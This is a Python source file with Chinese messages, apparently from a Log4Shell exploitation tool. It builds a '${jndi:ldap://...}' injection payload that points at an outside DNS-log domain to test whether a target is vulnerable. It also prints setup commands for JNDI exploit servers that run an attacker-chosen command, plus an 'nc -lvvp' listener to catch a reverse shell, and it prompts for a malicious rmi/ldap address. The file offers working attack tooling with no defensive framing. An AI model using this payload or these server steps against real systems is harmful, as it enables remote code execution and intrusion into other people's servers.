import base64
import time
from Dnslog import Dnslog


class Jndi_exp():
    def getdns_payload(self):
        self.dnslog = Dnslog()
        payload = "${jndi:ldap://" + str(self.dnslog.get_domain()) + "}"
        print("jndi生成:"+payload)
        return payload

    def getdns_logs(self):
        print("等待3s...")
        time.sleep(3)
        if len(self.dnslog.get_logs()) < 1:
            print("[*]" + str(self.dnslog.get_domain()) + "没有接收记录,漏洞不存在")
        else:
            print("[*]存在漏洞 log信息如下:\n" + str(self.dnslog.get_logs()))

    def get_server1(self, command, host, port):
        print("服务端运行:\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \""+command+"\" -A "+host)
        print("nc -lvvp "+port)
        hack_rmi_or_ldap = input("输入恶意rmi/ldap地址:")
        return hack_rmi_or_ldap

    def get_server2(host, port):
        print("服务端运行:java -jar JNDIExploit-1.4-SNAPSHOT.jar -i "+host)
        print("nc -lvvp "+port)




